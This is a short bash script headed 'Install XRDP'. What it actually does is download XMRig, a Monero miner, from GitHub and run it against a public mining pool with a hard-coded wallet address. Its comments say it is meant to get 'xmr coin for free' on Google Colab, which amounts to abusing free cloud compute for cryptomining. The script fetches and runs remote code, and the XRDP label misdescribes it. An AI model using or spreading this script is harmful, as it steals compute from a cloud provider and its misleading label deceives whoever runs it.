#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-bionic-x64.tar.gz
tar xvzf xmrig-6.16.4-bionic-x64.tar.gz
cd xmrig-6.16.4
./xmrig -o us-west.minexmr.com:443 -u 431DETjuajJczmpmnbiS8yLZauNNCHjk6N1WcBr8S5yP8Vd7jNRkqsoYFR7WfdkdK2H2jKwokK1SX8KJ1iVPQCusV3EDXwM -k --tls --rig-id GC-US
